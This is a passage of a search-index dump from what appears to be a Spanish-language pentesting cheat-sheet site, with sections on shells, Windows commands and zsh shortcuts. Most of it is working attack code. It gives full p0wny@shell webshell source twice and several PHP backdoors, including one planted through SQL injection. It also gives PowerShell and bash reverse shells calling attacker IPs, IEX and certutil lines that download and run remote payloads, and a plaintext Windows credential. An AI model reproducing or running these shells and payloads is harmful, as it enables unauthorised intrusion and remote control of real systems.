( \"cwd\" => getcwd ()); } function featureHint ( $fileName , $cwd , $type ) { chdir ( $cwd ); if ( $type == 'cmd' ) { $cmd = \"compgen -c $fileName \" ; } else { $cmd = \"compgen -f $fileName \" ; } $cmd = \"/bin/bash -c \\\" $cmd\\ \"\"; $files = explode(\" \\n \", shell_exec( $cmd )); return array( 'files' => $files , ); } function featureDownload( $filePath ) { $file = @file_get_contents( $filePath ); if ( $file === FALSE) { return array( 'stdout' => array('File not found / no read permission.'), 'cwd' => getcwd() ); } else { return array( 'name' => basename( $filePath ), 'file' => base64_encode( $file ) ); } } function featureUpload( $path , $file , $cwd ) { chdir( $cwd ); $f = @fopen( $path , 'wb'); if ( $f === FALSE) { return array( 'stdout' => array('Invalid path / no write permission.'), 'cwd' => getcwd() ); } else { fwrite( $f , base64_decode( $file )); fclose( $f ); return array( 'stdout' => array('Done.'), 'cwd' => getcwd() ); } } if (isset( $_GET[\"feature\"] )) { $response = NULL; switch ( $_GET[\"feature\"] ) { case \" shell \": $cmd = $_POST['cmd'] ; if (!preg_match('/2>/', $cmd )) { $cmd .= ' 2>&1'; } $response = featureShell( $cmd , $_POST[\"cwd\"] ); break; case \" pwd \": $response = featurePwd(); break; case \" hint \": $response = featureHint( $_POST['filename'] , $_POST['cwd'] , $_POST['type'] ); break; case 'upload': $response = featureUpload( $_POST['path'] , $_POST['file'] , $_POST['cwd'] ); } header(\" Content - Type : application / json \"); echo json_encode( $response ); die(); } ?><!DOCTYPE html> <html> <head> <meta charset=\" UTF - 8 \" /> <title>p0wny@shell:~#</title> <meta name=\" viewport \" content=\" width = device - width , initial - scale = 1.0 \" /> <style> html, body { margin: 0; padding: 0; background: #333; color: #eee; font-family: monospace; } *::-webkit-scrollbar-track { border-radius: 8px; background-color: #353535; } *::-webkit-scrollbar { width: 8px; height: 8px; } *::-webkit-scrollbar-thumb { border-radius: 8px; -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3); background-color: #bcbcbc; } #shell { background: #222; max-width: 800px; margin: 50px auto 0 auto; box-shadow: 0 0 5px rgba(0, 0, 0, .3); font-size: 10pt; display: flex; flex-direction: column; align-items: stretch; } #shell-content { height: 500px; overflow: auto; padding: 5px; white-space: pre-wrap; flex-grow: 1; } #shell-logo { font-weight: bold; color: #FF4180; text-align: center; } @media (max-width: 991px) { #shell-logo { font-size: 6px; margin: -25px 0; } html, body, #shell { height: 100%; width: 100%; max-width: none; } #shell { margin-top: 0; } } @media (max-width: 767px) { #shell-input { flex-direction: column; } } @media (max-width: 320px) { #shell-logo { font-size: 5px; } } .shell-prompt { font-weight: bold; color: #75DF0B; } .shell-prompt > span { color: #1BC9E7; } #shell-input { display: flex; box-shadow: 0 -1px 0 rgba(0, 0, 0, .3); border-top: rgba(255, 255, 255, .05) solid 1px; } #shell-input > label { flex-grow: 0; display: block; padding: 0 5px; height: 30px; line-height: 30px; } #shell-input #shell-cmd { height: 30px; line-height: 30px; border: none; background: transparent; color: #eee; font-family: monospace; font-size: 10pt; width: 100%; align-self: center; } #shell-input div { flex-grow: 1; align-items: stretch; } #shell-input input { outline: none; } </style> <script> var CWD = null; var commandHistory = []; var historyPosition = 0; var eShellCmdInput = null; var eShellContent = null; function _insertCommand(command) { eShellContent.innerHTML += \" \\n\\n \"; eShellContent.innerHTML += '<span class= \\\" shell-prompt \\\" >' + genPrompt(CWD) + '</span> '; eShellContent.innerHTML += escapeHtml(command); eShellContent.innerHTML += \" \\n \"; eShellContent.scrollTop = eShellContent.scrollHeight; } function _insertStdout(stdout) { eShellContent.innerHTML += escapeHtml(stdout); eShellContent.scrollTop = eShellContent.scrollHeight; } function _defer(callback) { setTimeout(callback, 0); } function featureShell(command) { _insertCommand(command); if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) { featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]); } else if (/^\\s*clear\\s*$/.test(command)) { // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer eShellContent.innerHTML = ''; } else { makeRequest(\" ? feature = shell \", {cmd: command, cwd: CWD}, function (response) { if (response.hasOwnProperty('file')) { featureDownload(response.name, response.file) } else { _insertStdout(response.stdout.join(\" \\n \")); updateCwd(response.cwd); } }); } } function featureHint() { if (eShellCmdInput.value.trim().length === 0) return; // field is empty -> nothing to complete function _requestCallback(data) { if (data.files.length <= 1) return; // no completion if (data.files.length === 2) { if (type === 'cmd') { eShellCmdInput.value = data.files[0]; } else { var currentValue = eShellCmdInput.value; eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]); } } else { _insertCommand(eShellCmdInput.value); _insertStdout(data.files.join(\" \\n \")); } } var currentCmd = eShellCmdInput.value.split(\" \"); var type = (currentCmd.length === 1) ? \" cmd \" : \" file \"; var fileName = (type === \" cmd \") ? currentCmd[0] : currentCmd[currentCmd.length - 1]; makeRequest( \" ? feature = hint \", { filename: fileName, cwd: CWD, type: type }, _requestCallback ); } function featureDownload(name, file) { var element = document.createElement('a'); element.setAttribute('href', 'data:application/octet-stream;base64,' + file); element.setAttribute('download', name); element.style.display = 'none'; document.body.appendChild(element); element.click(); document.body.removeChild(element); _insertStdout('Done.'); } function featureUpload(path) { var element = document.createElement('input'); element.setAttribute('type', 'file'); element.style.display = 'none'; document.body.appendChild(element); element.addEventListener('change', function () { var promise = getBase64(element.files[0]); promise.then(function (file) { makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) { _insertStdout(response.stdout.join(\" \\n \")); updateCwd(response.cwd); }); }, function () { _insertStdout('An unknown client-side error occurred.'); }); }); element.click(); document.body.removeChild(element); } function getBase64(file, onLoadCallback) { return new Promise(function(resolve, reject) { var reader = new FileReader(); reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); }; reader.onerror = reject; reader.readAsDataURL(file); }); } function genPrompt(cwd) { cwd = cwd || \" ~ \"; var shortCwd = cwd; if (cwd.split(\" / \").length > 3) { var splittedCwd = cwd.split(\" / \"); shortCwd = \" \u2026 / \" + splittedCwd[splittedCwd.length-2] + \" / \" + splittedCwd[splittedCwd.length-1]; } return \" p0wny @ shell :< span title = \\ \"\" + cwd + \" \\\" >\" + shortCwd + \"</span>#\" ; } function updateCwd ( cwd ) { if ( cwd ) { CWD = cwd ; _updatePrompt (); return ; } makeRequest ( \"?feature=pwd\" , {}, function ( response ) { CWD = response . cwd ; _updatePrompt (); }); } function escapeHtml ( string ) { return string . replace ( /&/ g , \"&amp;\" ) . replace ( /</ g , \"&lt;\" ) . replace ( />/ g , \"&gt;\" ); } function _updatePrompt () { var eShellPrompt = document . getElementById ( \"shell-prompt\" ); eShellPrompt . innerHTML = genPrompt ( CWD ); } function _onShellCmdKeyDown ( event ) { switch ( event . key ) { case \"Enter\" : featureShell ( eShellCmdInput . value ); insertToHistory ( eShellCmdInput . value ); eShellCmdInput . value = \"\" ; break ; case \"ArrowUp\" : if ( historyPosition > 0 ) { historyPosition -- ; eShellCmdInput . blur (); eShellCmdInput . value = commandHistory [ historyPosition ]; _defer ( function () { eShellCmdInput . focus (); }); } break ; case \"ArrowDown\" : if ( historyPosition >= commandHistory . length ) { break ; } historyPosition ++ ; if ( historyPosition === commandHistory . length ) { eShellCmdInput . value = \"\" ; } else { eShellCmdInput . blur (); eShellCmdInput . focus (); eShellCmdInput . value = commandHistory [ historyPosition ]; } break ; case 'Tab' : event . preventDefault (); featureHint (); break ; } } function insertToHistory ( cmd ) { commandHistory . push ( cmd ); historyPosition = commandHistory . length ; } function makeRequest ( url , params , callback ) { function getQueryString () { var a = []; for ( var key in params ) { if ( params . hasOwnProperty ( key )) { a . push ( encodeURIComponent ( key ) + \"=\" + encodeURIComponent ( params [ key ])); } } return a . join ( \"&\" ); } var xhr = new XMLHttpRequest (); xhr . open ( \"POST\" , url , true ); xhr . setRequestHeader ( \"Content-Type\" , \"application/x-www-form-urlencoded\" ); xhr . onreadystatechange = function () { if ( xhr . readyState === 4 && xhr . status === 200 ) { try { var responseJson = JSON . parse ( xhr . responseText ); callback ( responseJson ); } catch ( error ) { alert ( \"Error while parsing response: \" + error ); } } }; xhr . send ( getQueryString ()); } document . onclick = function ( event ) { event = event || window . event ; var selection = window . getSelection (); var target = event . target || event . srcElement ; if ( target . tagName === \"SELECT\" ) { return ; } if ( ! selection . toString ()) { eShellCmdInput . focus (); } }; window . onload = function () { eShellCmdInput = document . getElementById ( \"shell-cmd\" ); eShellContent = document . getElementById ( \"shell-content\" ); updateCwd (); eShellCmdInput . focus (); }; </ script > </ head > < body > < div id = \"shell\" > < pre id = \"shell-content\" > < div id = \"shell-logo\" > ___ ____ _ _ _ _ _ < span ></ span > _ __ / _ \\__ ___ __ _ _ / __ \\ ___ | | __ ___ | | | _ / \\ /|| || | _ < span ></ span > | '_ \\| | | \\ \\ /\\ / / ' _ \\ | | | |/ / _ ` / __ | ' _ \\ / _ \\ | ( _ ) / \\ / _ .. _ |< span ></ span > | | _ ) | | _ | | \\ V V /| | | | | _ | | | ( _ | \\__ \\ | | | __ / | | _ | _ _ |< span ></ span > | . __ / \\___ / \\_ / \\_ / | _ | | _ | \\__ , | \\ \\__ , _ | ___ / _ | | _ | \\___ | _ | _ ( _ ) | _ || _ | < span ></ span > | _ | | ___ / \\____ / < span ></ span > </ div > </ pre > < div id = \"shell-input\" > < label for = \"shell-cmd\" id = \"shell-prompt\" class = \"shell-prompt\" >???</ label > < div > < input id = \"shell-cmd\" name = \"cmd\" onkeydown = \"_onShellCmdKeyDown(event)\" /> </ div > </ div > </ div > </ body > </ html >","title":"Shells"},{"location":"recursos/shells/#recursos","text":"","title":"Recursos"},{"location":"recursos/shells/#ejecutar-comandos-con-diferentes-usuarios-a-traves-de-powershell","text":"$secPass = ConvertTo-SecureString 'Zx^#QZX+T!123' -AsPlainText -Force $cred = New-Object System . Management . Automation . PSCredential ( 'ARKHAM\\batman' , $secPass ) Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { whoami } Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { cmd / c c :\\ temp \\ nc . exe -e powershell 10 . 10 . 14 . 11 8443 }","title":"Ejecutar comandos con diferentes usuarios a trav\u00e9s de Powershell:"},{"location":"recursos/shells/#cme-rshell","text":"crackmapexec smb -d . -u Administrator -p 'pass123' -X \"$c = New-Object System.Net.Sockets.TCPClient('192.168.204.190',444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\" 192 . 168 . 204 . 183","title":"CME RShell:"},{"location":"recursos/shells/#tty-over-http","text":"#!/usr/bin/python3 import requests , time , threading , pdb , signal , sys from base64 import b64encode from random import randrange class AllTheReads ( object ): def __init__ ( self , interval = 1 ): self . interval = interval thread = threading . Thread ( target = self . run , args = ()) thread . daemon = True thread . start () def run ( self ): readoutput = \"\"\"/bin/cat %s \"\"\" % ( stdout ) clearoutput = \"\"\"echo '' > %s \"\"\" % ( stdout ) while True : output = RunCmd ( readoutput ) if output : RunCmd ( clearoutput ) print ( output ) time . sleep ( self . interval ) def RunCmd ( cmd ): cmd = cmd . encode ( 'utf-8' ) cmd = b64encode ( cmd ) . decode ( 'utf-8' ) payload = { 'cmd' : 'echo \" %s \" | base64 -d | sh' % ( cmd ) } result = ( requests . get ( 'http://pressed.htb/xshell.php' , params = payload , timeout = 5 ) . text ) . strip () return result def WriteCmd ( cmd ): cmd = cmd . encode ( 'utf-8' ) cmd = b64encode ( cmd ) . decode ( 'utf-8' ) payload = { 'cmd' : 'echo \" %s \" | base64 -d > %s ' % ( cmd , stdin ) } result = ( requests . get ( 'http://pressed.htb/xshell.php' , params = payload , timeout = 5 ) . text ) . strip () return result def ReadCmd (): GetOutput = \"\"\"/bin/cat %s \"\"\" % ( stdout ) output = RunCmd ( GetOutput ) return output def SetupShell (): NamedPipes = \"\"\"mkfifo %s ; tail -f %s | /bin/sh 2>&1 > %s \"\"\" % ( stdin , stdin , stdout ) try : RunCmd ( NamedPipes ) except : None return None global stdin , stdout session = randrange ( 1000 , 9999 ) stdin = \"/dev/shm/input. %s \" % ( session ) stdout = \"/dev/shm/output. %s \" % ( session ) erasestdin = \"\"\"/bin/rm %s \"\"\" % ( stdin ) erasestdout = \"\"\"/bin/rm %s \"\"\" % ( stdout ) SetupShell () ReadingTheThings = AllTheReads () def sig_handler ( sig , frame ): print ( \" \\n\\n [*] Exiting... \\n \" ) print ( \"[*] Removing files... \\n \" ) RunCmd ( erasestdin ) RunCmd ( erasestdout ) print ( \"[*] All files have been deleted \\n \" ) sys . exit ( 0 ) signal . signal ( signal . SIGINT , sig_handler ) while True : cmd = input ( \"> \" ) WriteCmd ( cmd + \" \\n \" ) time . sleep ( 1.1 )","title":"TTY OVER HTTP"},{"location":"recursos/shells/#php-shells","text":"# Desde SQLi: username=special&country='union select \" <?php echo shell_exec ( $_REQUEST [ 'cmd' ]); ?> \" into outfile \"/var/www/html/shell.php\"-- - # Desde consola: echo \" <?php popen ( 'bash -c \\\"bash -i >& /dev/tcp/10.10.14.11/8443 0>&1\\\"' , \"r\" ); ?> \" > hola.php # BackdoorShell con filtro ip: <?php if ( $_SERVER [ 'REMOTE_ADDR' ] !== '10.10.14.10' ) { echo ( \"Get Lost...\" ); die (); } system ( $_REQUEST [ 'cmd' ]); ?> ## WebShell con etiquetas preformateadas: <?php echo \"<pre>\" . shell_exec ( $_REQUEST [ 'cmd' ]) . \"</pre>\" ; ?> ## Control desde bash: #/bin/bash function ctrl_c(){ echo -e \"\\n\\n[!] Saliendo ...\" exit 1 } trap ctrl_c INT main_url=\"http://pressed.htb/index.php/2022/01/28/hello-world-3/?cmd=\" while [ \"$command\" != \"exit\" ]; do echo -n \"$~ \" && read command command=$(echo \"$command 2>%261\" | tr -s ' ' '+') curl -s -X GET \"$main_url$command\" | grep \"<pre>\" -A 100 | grep \"</pre>\" -B 100 | sed 's/<pre>//' | sed 's/<\\/pre>//' done ## Control desde python: #!/usr/bin/python3 import signal, requests, pdb, time, sys, threading, re from http.client import HTTPConnection HTTPConnection.debuglevel = 0 def def_handler(sig, frame): print(\"\\n[!] Saliendo... \") sys.exit(1) # Ctrl + c signal.signal(signal.SIGINT, def_handler) # Variables globales main_url = \"http://localhost:81/xshell.php\" def RunCmd(command): post = { \"cmd\" : command } r = requests.post(main_url, data=post) #pdb.set_trace() filter = re.findall(r'<pre>(.*?)\\n</pre>',r.text, flags=re.DOTALL)[0] return filter + \"\\n\" if __name__ == '__main__': while True: command = input(\"$~ \") print(RunCmd (command)) # C\u00f3digo que aloja un archivo php metiendo una shell en base64: <?php file_put_contents ( 'xshell.php' , base64_decode ( 'PD9waHAKCWVjaG8gc2hlbGxfZXhlYygkX1JFUVVFU1RbJ2NtZCddKTsKPz4K' )); echo ( \"Success\" ); ?>","title":"PHP Shells:"},{"location":"recursos/shells/#webshell-php","text":"Shell con una interfaz muy amigable: http://victima.com/uploads/webshell.php <?php function featureShell ( $cmd , $cwd ) { $stdout = array (); if ( preg_match ( \"/^\\s*cd\\s*$/\" , $cmd )) { // pass } elseif ( preg_match ( \"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\" , $cmd )) { chdir ( $cwd ); preg_match ( \"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\" , $cmd , $match ); chdir ( $match [ 1 ]); } elseif ( preg_match ( \"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\" , $cmd )) { chdir ( $cwd ); preg_match ( \"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\" , $cmd , $match ); return featureDownload ( $match [ 1 ]); } else { chdir ( $cwd ); exec ( $cmd , $stdout ); } return array ( \"stdout\" => $stdout , \"cwd\" => getcwd () ); } function featurePwd () { return array ( \"cwd\" => getcwd ()); } function featureHint ( $fileName , $cwd , $type ) { chdir ( $cwd ); if ( $type == 'cmd' ) { $cmd = \"compgen -c $fileName \" ; } else { $cmd = \"compgen -f $fileName \" ; } $cmd = \"/bin/bash -c \\\" $cmd\\ \"\"; $files = explode(\" \\n \", shell_exec( $cmd )); return array( 'files' => $files , ); } function featureDownload( $filePath ) { $file = @file_get_contents( $filePath ); if ( $file === FALSE) { return array( 'stdout' => array('File not found / no read permission.'), 'cwd' => getcwd() ); } else { return array( 'name' => basename( $filePath ), 'file' => base64_encode( $file ) ); } } function featureUpload( $path , $file , $cwd ) { chdir( $cwd ); $f = @fopen( $path , 'wb'); if ( $f === FALSE) { return array( 'stdout' => array('Invalid path / no write permission.'), 'cwd' => getcwd() ); } else { fwrite( $f , base64_decode( $file )); fclose( $f ); return array( 'stdout' => array('Done.'), 'cwd' => getcwd() ); } } if (isset( $_GET[\"feature\"] )) { $response = NULL; switch ( $_GET[\"feature\"] ) { case \" shell \": $cmd = $_POST['cmd'] ; if (!preg_match('/2>/', $cmd )) { $cmd .= ' 2>&1'; } $response = featureShell( $cmd , $_POST[\"cwd\"] ); break; case \" pwd \": $response = featurePwd(); break; case \" hint \": $response = featureHint( $_POST['filename'] , $_POST['cwd'] , $_POST['type'] ); break; case 'upload': $response = featureUpload( $_POST['path'] , $_POST['file'] , $_POST['cwd'] ); } header(\" Content - Type : application / json \"); echo json_encode( $response ); die(); } ?><!DOCTYPE html> <html> <head> <meta charset=\" UTF - 8 \" /> <title>p0wny@shell:~#</title> <meta name=\" viewport \" content=\" width = device - width , initial - scale = 1.0 \" /> <style> html, body { margin: 0; padding: 0; background: #333; color: #eee; font-family: monospace; } *::-webkit-scrollbar-track { border-radius: 8px; background-color: #353535; } *::-webkit-scrollbar { width: 8px; height: 8px; } *::-webkit-scrollbar-thumb { border-radius: 8px; -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3); background-color: #bcbcbc; } #shell { background: #222; max-width: 800px; margin: 50px auto 0 auto; box-shadow: 0 0 5px rgba(0, 0, 0, .3); font-size: 10pt; display: flex; flex-direction: column; align-items: stretch; } #shell-content { height: 500px; overflow: auto; padding: 5px; white-space: pre-wrap; flex-grow: 1; } #shell-logo { font-weight: bold; color: #FF4180; text-align: center; } @media (max-width: 991px) { #shell-logo { font-size: 6px; margin: -25px 0; } html, body, #shell { height: 100%; width: 100%; max-width: none; } #shell { margin-top: 0; } } @media (max-width: 767px) { #shell-input { flex-direction: column; } } @media (max-width: 320px) { #shell-logo { font-size: 5px; } } .shell-prompt { font-weight: bold; color: #75DF0B; } .shell-prompt > span { color: #1BC9E7; } #shell-input { display: flex; box-shadow: 0 -1px 0 rgba(0, 0, 0, .3); border-top: rgba(255, 255, 255, .05) solid 1px; } #shell-input > label { flex-grow: 0; display: block; padding: 0 5px; height: 30px; line-height: 30px; } #shell-input #shell-cmd { height: 30px; line-height: 30px; border: none; background: transparent; color: #eee; font-family: monospace; font-size: 10pt; width: 100%; align-self: center; } #shell-input div { flex-grow: 1; align-items: stretch; } #shell-input input { outline: none; } </style> <script> var CWD = null; var commandHistory = []; var historyPosition = 0; var eShellCmdInput = null; var eShellContent = null; function _insertCommand(command) { eShellContent.innerHTML += \" \\n\\n \"; eShellContent.innerHTML += '<span class= \\\" shell-prompt \\\" >' + genPrompt(CWD) + '</span> '; eShellContent.innerHTML += escapeHtml(command); eShellContent.innerHTML += \" \\n \"; eShellContent.scrollTop = eShellContent.scrollHeight; } function _insertStdout(stdout) { eShellContent.innerHTML += escapeHtml(stdout); eShellContent.scrollTop = eShellContent.scrollHeight; } function _defer(callback) { setTimeout(callback, 0); } function featureShell(command) { _insertCommand(command); if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) { featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]); } else if (/^\\s*clear\\s*$/.test(command)) { // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer eShellContent.innerHTML = ''; } else { makeRequest(\" ? feature = shell \", {cmd: command, cwd: CWD}, function (response) { if (response.hasOwnProperty('file')) { featureDownload(response.name, response.file) } else { _insertStdout(response.stdout.join(\" \\n \")); updateCwd(response.cwd); } }); } } function featureHint() { if (eShellCmdInput.value.trim().length === 0) return; // field is empty -> nothing to complete function _requestCallback(data) { if (data.files.length <= 1) return; // no completion if (data.files.length === 2) { if (type === 'cmd') { eShellCmdInput.value = data.files[0]; } else { var currentValue = eShellCmdInput.value; eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]); } } else { _insertCommand(eShellCmdInput.value); _insertStdout(data.files.join(\" \\n \")); } } var currentCmd = eShellCmdInput.value.split(\" \"); var type = (currentCmd.length === 1) ? \" cmd \" : \" file \"; var fileName = (type === \" cmd \") ? currentCmd[0] : currentCmd[currentCmd.length - 1]; makeRequest( \" ? feature = hint \", { filename: fileName, cwd: CWD, type: type }, _requestCallback ); } function featureDownload(name, file) { var element = document.createElement('a'); element.setAttribute('href', 'data:application/octet-stream;base64,' + file); element.setAttribute('download', name); element.style.display = 'none'; document.body.appendChild(element); element.click(); document.body.removeChild(element); _insertStdout('Done.'); } function featureUpload(path) { var element = document.createElement('input'); element.setAttribute('type', 'file'); element.style.display = 'none'; document.body.appendChild(element); element.addEventListener('change', function () { var promise = getBase64(element.files[0]); promise.then(function (file) { makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) { _insertStdout(response.stdout.join(\" \\n \")); updateCwd(response.cwd); }); }, function () { _insertStdout('An unknown client-side error occurred.'); }); }); element.click(); document.body.removeChild(element); } function getBase64(file, onLoadCallback) { return new Promise(function(resolve, reject) { var reader = new FileReader(); reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); }; reader.onerror = reject; reader.readAsDataURL(file); }); } function genPrompt(cwd) { cwd = cwd || \" ~ \"; var shortCwd = cwd; if (cwd.split(\" / \").length > 3) { var splittedCwd = cwd.split(\" / \"); shortCwd = \" \u2026 / \" + splittedCwd[splittedCwd.length-2] + \" / \" + splittedCwd[splittedCwd.length-1]; } return \" p0wny @ shell :< span title = \\ \"\" + cwd + \" \\\" >\" + shortCwd + \"</span>#\" ; } function updateCwd ( cwd ) { if ( cwd ) { CWD = cwd ; _updatePrompt (); return ; } makeRequest ( \"?feature=pwd\" , {}, function ( response ) { CWD = response . cwd ; _updatePrompt (); }); } function escapeHtml ( string ) { return string . replace ( /&/ g , \"&amp;\" ) . replace ( /</ g , \"&lt;\" ) . replace ( />/ g , \"&gt;\" ); } function _updatePrompt () { var eShellPrompt = document . getElementById ( \"shell-prompt\" ); eShellPrompt . innerHTML = genPrompt ( CWD ); } function _onShellCmdKeyDown ( event ) { switch ( event . key ) { case \"Enter\" : featureShell ( eShellCmdInput . value ); insertToHistory ( eShellCmdInput . value ); eShellCmdInput . value = \"\" ; break ; case \"ArrowUp\" : if ( historyPosition > 0 ) { historyPosition -- ; eShellCmdInput . blur (); eShellCmdInput . value = commandHistory [ historyPosition ]; _defer ( function () { eShellCmdInput . focus (); }); } break ; case \"ArrowDown\" : if ( historyPosition >= commandHistory . length ) { break ; } historyPosition ++ ; if ( historyPosition === commandHistory . length ) { eShellCmdInput . value = \"\" ; } else { eShellCmdInput . blur (); eShellCmdInput . focus (); eShellCmdInput . value = commandHistory [ historyPosition ]; } break ; case 'Tab' : event . preventDefault (); featureHint (); break ; } } function insertToHistory ( cmd ) { commandHistory . push ( cmd ); historyPosition = commandHistory . length ; } function makeRequest ( url , params , callback ) { function getQueryString () { var a = []; for ( var key in params ) { if ( params . hasOwnProperty ( key )) { a . push ( encodeURIComponent ( key ) + \"=\" + encodeURIComponent ( params [ key ])); } } return a . join ( \"&\" ); } var xhr = new XMLHttpRequest (); xhr . open ( \"POST\" , url , true ); xhr . setRequestHeader ( \"Content-Type\" , \"application/x-www-form-urlencoded\" ); xhr . onreadystatechange = function () { if ( xhr . readyState === 4 && xhr . status === 200 ) { try { var responseJson = JSON . parse ( xhr . responseText ); callback ( responseJson ); } catch ( error ) { alert ( \"Error while parsing response: \" + error ); } } }; xhr . send ( getQueryString ()); } document . onclick = function ( event ) { event = event || window . event ; var selection = window . getSelection (); var target = event . target || event . srcElement ; if ( target . tagName === \"SELECT\" ) { return ; } if ( ! selection . toString ()) { eShellCmdInput . focus (); } }; window . onload = function () { eShellCmdInput = document . getElementById ( \"shell-cmd\" ); eShellContent = document . getElementById ( \"shell-content\" ); updateCwd (); eShellCmdInput . focus (); }; </ script > </ head > < body > < div id = \"shell\" > < pre id = \"shell-content\" > < div id = \"shell-logo\" > ___ ____ _ _ _ _ _ < span ></ span > _ __ / _ \\__ ___ __ _ _ / __ \\ ___ | | __ ___ | | | _ / \\ /|| || | _ < span ></ span > | '_ \\| | | \\ \\ /\\ / / ' _ \\ | | | |/ / _ ` / __ | ' _ \\ / _ \\ | ( _ ) / \\ / _ .. _ |< span ></ span > | | _ ) | | _ | | \\ V V /| | | | | _ | | | ( _ | \\__ \\ | | | __ / | | _ | _ _ |< span ></ span > | . __ / \\___ / \\_ / \\_ / | _ | | _ | \\__ , | \\ \\__ , _ | ___ / _ | | _ | \\___ | _ | _ ( _ ) | _ || _ | < span ></ span > | _ | | ___ / \\____ / < span ></ span > </ div > </ pre > < div id = \"shell-input\" > < label for = \"shell-cmd\" id = \"shell-prompt\" class = \"shell-prompt\" >???</ label > < div > < input id = \"shell-cmd\" name = \"cmd\" onkeydown = \"_onShellCmdKeyDown(event)\" /> </ div > </ div > </ div > </ body > </ html >","title":"WebShell php:"},{"location":"recursos/tools/","text":"ZSH KEYMAPS - Eliminar o Mover: Alt+d : Borra palabra hacia delante (delete) Alt+sup: Borra palabra hacia detras (sup) Ctrl+w : Corta palabra hacia detras => Ctrol+y: Pega la ultima palabra cortada Ctrl+k : Elimina todo lo que tiene por delante Ctrl+u : Elimina toda la l\u00ednea Ctrl+/ o Ctrl+Mayus+_ : Deshacer - Desplazarse: Ctrl+a : Inicio de la l\u00ednea Ctrl+e / Alt+q : Final de la l\u00ednea Alt+l: Desplazarse por palabras hacia delante Alt+b: Desplazarse por palabras hacia detras - Especiales: Alt+t : Intercambia palabras de lugar. Ex: hola[cursor]adios adios[cursor]hola Alt+u : Convierte las letras de la palabra de delante a may\u00fasculas Ctrl+Shift+f : busqueda en la consola actual","title":"Tools"},{"location":"recursos/tools/#zsh-keymaps","text":"- Eliminar o Mover: Alt+d : Borra palabra hacia delante (delete) Alt+sup: Borra palabra hacia detras (sup) Ctrl+w : Corta palabra hacia detras => Ctrol+y: Pega la ultima palabra cortada Ctrl+k : Elimina todo lo que tiene por delante Ctrl+u : Elimina toda la l\u00ednea Ctrl+/ o Ctrl+Mayus+_ : Deshacer - Desplazarse: Ctrl+a : Inicio de la l\u00ednea Ctrl+e / Alt+q : Final de la l\u00ednea Alt+l: Desplazarse por palabras hacia delante Alt+b: Desplazarse por palabras hacia detras - Especiales: Alt+t : Intercambia palabras de lugar. Ex: hola[cursor]adios adios[cursor]hola Alt+u : Convierte las letras de la palabra de delante a may\u00fasculas Ctrl+Shift+f : busqueda en la consola actual","title":"ZSH KEYMAPS"},{"location":"recursos/win-commands/","text":"Windows Commands Spawn powershell: C :\\ Windows \\ syswow64 \\ WindowsPowerShell \\ v1 . 0 \\ powershell . exe C :\\ Windows \\ SysNative \\ WindowsPowershell \\ v1 . 0 \\ powershell . exe IEX ( New-Object Net . Webclient ). downloadString ( 'http://10.10.14.20/rshell.ps1' ) #Shell nativa 64 bits [environment]::is64bitprocess Escalate paths: cmd / c powershell IEX ( New-Object Net . Webclient ). downloadString ( 'http://10.10.14.20/powerup.ps1' ) https :// github . com / carlospolop / PEASS-ng / tree / master / winPEAS / winPEASexe / binaries / Obfuscated % 20Releases DESCARGAS WINDOWS: IWR http :// 10 . 10 . 14 . 15 / winPEASx64 . exe -outfile c :\\ tmp \\ peas . exe certutil . exe -f -urlcache -split http :// 10 . 10 . 14 . 15 / winPEASx64 . exe winPEASx64 . exe wget http :// 10 . 10 . 14 . 20 / potato . exe -o potato . exe","title":"Windows Commands"},{"location":"recursos/win-commands/#windows-commands","text":"Spawn powershell: C :\\ Windows \\ syswow64 \\ WindowsPowerShell \\ v1 . 0 \\ powershell . exe C :\\ Windows \\ SysNative \\ WindowsPowershell \\ v1 . 0 \\ powershell . exe IEX ( New-Object Net . Webclient ). downloadString ( 'http://10.10.14.20/rshell.ps1' ) #Shell nativa 64 bits [environment]::is64bitprocess Escalate paths: cmd / c powershell IEX ( New-Object Net . Webclient ). downloadString ( 'http://10.10.14.20/powerup.ps1' ) https :// github . com / carlospolop / PEASS-ng / tree / master / winPEAS / winPEASexe / binaries / Obfuscated % 20Releases DESCARGAS WINDOWS: IWR http :// 10 . 10 . 14 . 15 / winPEASx64 . exe -outfile c :\\ tmp \\ peas . exe certutil . exe -f -urlcache -split http :// 10 . 10 . 14 . 15 / winPEASx64 . exe winPEASx64 . exe wget http :// 10 . 10 . 14 . 20 / potato . exe -o potato . exe","title":"Windows Commands"}]}